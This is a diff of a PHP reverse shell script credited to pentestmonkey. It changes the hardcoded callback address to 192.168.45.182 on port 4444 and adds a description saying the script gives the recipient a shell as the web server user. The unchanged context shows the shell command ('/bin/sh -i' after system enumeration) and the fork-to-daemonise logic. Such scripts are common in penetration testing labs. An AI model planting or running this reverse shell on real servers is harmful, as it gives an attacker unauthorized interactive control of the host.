@@ -1,10 +1,17 @@
 <?php
-// A MODIFIED VERSION OF PENTESTMONKEYS PHP SCRIPT!
+
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Mostly Written by @pentestmonkey, changes for newer php version made by slasher
+
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.45.222';  // CHANGE THIS
-$port = 4444;       // CHANGE THIS
+$ip = '192.168.45.182';  // CHANGE
+$port = 4444;       // CHANGE
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -12,12 +19,6 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
-//
-// Daemonise ourself if possible to avoid zombies later
-//
-
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
 if (function_exists('pcntl_fork')) {
 	// Fork and have the parent process exit
 	$pid = pcntl_fork();
